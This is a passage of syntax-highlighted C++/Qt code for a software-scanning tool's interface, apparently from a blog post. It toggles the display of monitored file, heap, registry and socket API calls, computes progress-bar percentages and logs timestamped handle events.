((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;ReadFile&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">			&#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_CloseHandle</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.FileApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;CloseHandle&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">			&#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_copyfilea</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.FileApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;CopyFileA&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">			&#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_HeapCreate</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.HeapApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;HeapCreate&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_HeapDestroy</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.HeapApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;HeapDestroy&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_HeapFree</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.HeapApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;HeapFree&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_HeapAlloc</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.HeapApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;HeapAlloc&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_RegCreateKeyEx</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.RegApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;RegCreateKeyEx&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_RegCloseKey</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.RegApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;RegCloseKey&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_RegSetValueEx</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.RegApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;RegSetValueEx&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_RegDeleteValue</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.RegApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;RegDeleteValue&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_RegOpenKeyEx</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.RegApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;RegOpenKeyEx&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_socket</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.SocketApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;socket&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_bind</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.SocketApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;bind&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_send</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.SocketApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;send&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_connect</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.SocketApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;connect&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::State_recv</span><span class="params">(<span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">it</span><span class="params">(ui.SocketApiInfo)</span></span>;</span><br><span class="line">	<span class="keyword">while</span> (*it)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*it)-&gt;<span class="built_in">text</span>(<span class="number">0</span>) == <span class="string">&quot;recv&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (state == Qt::Checked)</span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				(*it)-&gt;<span class="built_in">setHidden</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		++it;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ProgressBar</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算显示条</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::ProgressBar</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> count, Num;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">message</span><span class="params">(ui.MessageBoxInfo, QTreeWidgetItemIterator::HasChildren)</span></span>;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">file</span><span class="params">(ui.FileApiInfo, QTreeWidgetItemIterator::HasChildren)</span></span>;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">heap</span><span class="params">(ui.HeapApiInfo, QTreeWidgetItemIterator::HasChildren)</span></span>;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">reg</span><span class="params">(ui.RegApiInfo, QTreeWidgetItemIterator::HasChildren)</span></span>;</span><br><span class="line">	<span class="function">QTreeWidgetItemIterator <span class="title">thesocket</span><span class="params">(ui.SocketApiInfo, QTreeWidgetItemIterator::HasChildren)</span></span>;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (i)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">		Num = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (*message)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ((*message)-&gt;<span class="built_in">isHidden</span>() == TRUE)</span><br><span class="line">			&#123;</span><br><span class="line">				Num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				Num++;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">			++message;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (Num != <span class="number">0</span>) &#123;</span><br><span class="line">			ui.progress_message-&gt;<span class="built_in">setValue</span>((<span class="keyword">int</span>)(count * <span class="number">100</span> / Num));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			ui.progress_message-&gt;<span class="built_in">setValue</span>(<span class="number">100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">		Num = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (*file)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ((*file)-&gt;<span class="built_in">isHidden</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				Num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				Num++;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">			++file;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//ui.progress_file-&gt;setValue((int)(count * 100 / Num));</span></span><br><span class="line">		<span class="keyword">if</span> (Num != <span class="number">0</span>) &#123;</span><br><span class="line">			ui.progress_file-&gt;<span class="built_in">setValue</span>((<span class="keyword">int</span>)(count * <span class="number">100</span> / Num));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			ui.progress_file-&gt;<span class="built_in">setValue</span>(<span class="number">100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">		Num = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (*heap)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ((*heap)-&gt;<span class="built_in">isHidden</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				Num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				Num++;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">			++heap;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//ui.progress_heap-&gt;setValue((int)(count * 100 / Num));</span></span><br><span class="line">		<span class="keyword">if</span> (Num != <span class="number">0</span>) &#123;</span><br><span class="line">			ui.progress_heap-&gt;<span class="built_in">setValue</span>((<span class="keyword">int</span>)(count * <span class="number">100</span> / Num));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			ui.progress_heap-&gt;<span class="built_in">setValue</span>(<span class="number">100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">		Num = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (*reg)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ((*reg)-&gt;<span class="built_in">isHidden</span>())</span><br><span class="line">				Num++;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				Num++;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">			++reg;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//ui.progress_reg-&gt;setValue((int)(count * 100 / Num));</span></span><br><span class="line">		<span class="keyword">if</span> (Num != <span class="number">0</span>) &#123;</span><br><span class="line">			ui.progress_reg-&gt;<span class="built_in">setValue</span>((<span class="keyword">int</span>)(count * <span class="number">100</span> / Num));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			ui.progress_reg-&gt;<span class="built_in">setValue</span>(<span class="number">100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">		Num = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (*thesocket)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ((*thesocket)-&gt;<span class="built_in">isHidden</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				Num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				count++;</span><br><span class="line">				Num++;</span><br><span class="line">			&#125;</span><br><span class="line">			++thesocket;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (Num != <span class="number">0</span>) &#123;</span><br><span class="line">			ui.progress_socket-&gt;<span class="built_in">setValue</span>((<span class="keyword">int</span>)(count * <span class="number">100</span> / Num));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			ui.progress_socket-&gt;<span class="built_in">setValue</span>(<span class="number">100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常记录函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::NewHeapInfo</span><span class="params">( QString string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	QListWidgetItem* item = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	SYSTEMTIME st;</span><br><span class="line">	<span class="built_in">GetLocalTime</span>(&amp;st);</span><br><span class="line">	<span class="keyword">char</span> temp[<span class="number">150</span>];</span><br><span class="line">	<span class="keyword">char</span> hd[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">sprintf</span>(temp, <span class="string">&quot;当前时间：%d:%d:%d &quot;</span>, st.wMinute, st.wSecond, st.wMilliseconds);</span><br><span class="line">	QString str = QString::<span class="built_in">fromLocal8Bit</span>(temp);</span><br><span class="line">	item-&gt;<span class="built_in">setText</span>(<span class="built_in">QString</span>( str+ string));</span><br><span class="line">	<span class="comment">//ui.HeapException-&gt;clear();</span></span><br><span class="line">	HeapException-&gt;<span class="built_in">addItem</span>(item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::NewRegInfo</span><span class="params">(<span class="keyword">int</span> handle, QString string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//接收到注册键的句柄</span></span><br><span class="line">	QListWidgetItem* item = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	SYSTEMTIME st;</span><br><span class="line">	<span class="built_in">GetLocalTime</span>(&amp;st);</span><br><span class="line">	<span class="keyword">char</span> temp[<span class="number">150</span>];</span><br><span class="line">	<span class="keyword">char</span> hd[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">itoa</span>(handle, hd, <span class="number">16</span>);</span><br><span class="line">	<span class="built_in">sprintf</span>(temp, <span class="string">&quot;当前时间：%d:%d:%d  注册键句柄：%08X\n&quot;</span>, st.wMinute, st.wSecond, st.wMilliseconds, hd);</span><br><span class="line">	QString str = QString::<span class="built_in">fromLocal8Bit</span>(temp);</span><br><span class="line">	item-&gt;<span class="built_in">setText</span>(<span class="built_in">QString</span>(str + string));</span><br><span class="line">	<span class="comment">//ui.HeapException-&gt;clear();</span></span><br><span class="line">	RegException-&gt;<span class="built_in">addItem</span>(item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::NewFileInfo</span><span class="params">(<span class="keyword">int</span> handle, QString string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//接收到文件句柄</span></span><br><span class="line">	QListWidgetItem* item = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	SYSTEMTIME st;</span><br><span class="line">	<span class="built_in">GetLocalTime</span>(&amp;st);</span><br><span class="line">	<span class="keyword">char</span> temp[<span class="number">150</span>];</span><br><span class="line">	<span class="keyword">char</span> hd[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">itoa</span>(handle, hd, <span class="number">16</span>);</span><br><span class="line">	<span class="built_in">sprintf</span>(temp, <span class="string">&quot;当前时间：%d:%d:%d  文件句柄：%08X\n&quot;</span>, st.wMinute, st.wSecond, st.wMilliseconds, hd);</span><br><span class="line">	QString str = QString::<span class="built_in">fromLocal8Bit</span>(temp);</span><br><span class="line">	item-&gt;<span class="built_in">setText</span>(<span class="built_in">QString</span>(str + string));</span><br><span class="line">	<span class="comment">//ui.HeapException-&gt;clear();</span></span><br><span class="line">	FileException-&gt;<span class="built_in">addItem</span>(item);</span><br><span class="line">&#125;</span><br><span 